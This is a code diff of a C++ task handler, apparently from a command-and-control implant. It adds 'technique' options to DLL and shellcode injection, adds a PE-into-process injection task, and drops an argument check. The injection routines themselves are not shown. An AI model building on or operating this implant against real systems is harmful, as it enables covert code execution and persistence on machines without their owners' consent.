@@ -201,7 +201,8 @@ namespace Handler
                 wTaskResult = Task::Dll(
                     pState,
                     Utils::Convert::UTF8Decode(args["pid"]),
-                    Utils::Convert::UTF8Decode(args["dll"])
+                    Utils::Convert::UTF8Decode(args["dll"]),
+                    Utils::Convert::UTF8Decode(args["technique"])
                 );
                 break;
             case TASK_DOWNLOAD:
@@ -213,9 +214,6 @@ namespace Handler
                 break;
             case TASK_ENV_LS:
                 wTaskResult = Task::EnvLs(pState);
-                break;
-            case TASK_EXE:
-                wTaskResult = Task::Exe(pState, Utils::Convert::UTF8Decode(args["exe"]));
                 break;
             case TASK_GROUP_LS:
                 wTaskResult = Task::GroupLs();
@@ -256,6 +254,14 @@ namespace Handler
                 break;
             case TASK_NET:
                 wTaskResult = Task::Net();
+                break;
+            case TASK_PE:
+                wTaskResult = Task::Pe(
+                    pState,
+                    Utils::Convert::UTF8Decode(args["target_process"]),
+                    Utils::Convert::UTF8Decode(args["pe"]),
+                    Utils::Convert::UTF8Decode(args["technique"])
+                );
                 break;
             case TASK_PERSIST:
                 wTaskResult = Task::Persist(pState, Utils::Convert::UTF8Decode(args["technique"]));
@@ -322,14 +328,11 @@ namespace Handler
                 #endif
                 break;
             case TASK_SHELLCODE:
-                if (args.size() != 2)
-                {
-                    return FALSE;
-                }
                 wTaskResult = Task::Shellcode(
                     pState,
                     Utils::Convert::UTF8Decode(args["pid"]),
-                    Utils::Convert::UTF8Decode(args["shellcode"])
+                    Utils::Convert::UTF8Decode(args["shellcode"]),
+                    Utils::Convert::UTF8Decode(args["technique"])
                 );
                 break;
             case TASK_SLEEP:
